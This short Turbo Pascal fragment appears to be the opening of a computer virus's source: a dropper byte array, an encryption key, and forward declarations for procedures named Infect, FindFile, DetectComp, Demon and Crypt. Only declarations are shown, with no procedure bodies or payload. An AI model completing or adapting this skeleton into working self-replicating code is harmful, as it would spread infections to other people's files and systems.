   {$M 6000, 4000, 6000}
   {$I-,S-}
   const dr:array[1..DropLen] of byte = {$I sd.inc};
         OldKey:array[1..20] of byte = ({$I sk.inc});
   var Command,Compile:string;
       Dummy:byte;
       a:dirstr;
       b:namestr;
       c:extstr;
       NewKey :array[1..20] of byte;
   procedure Infect(st:string);forward;
   procedure FindFile;forward;
   procedure MakeInc;forward;
   procedure MakePas;forward;
   procedure Start;forward;
   function DetectComp:boolean;forward;
   procedure Demon;forward;
   procedure Crypt(n:string;typ:byte);forward;
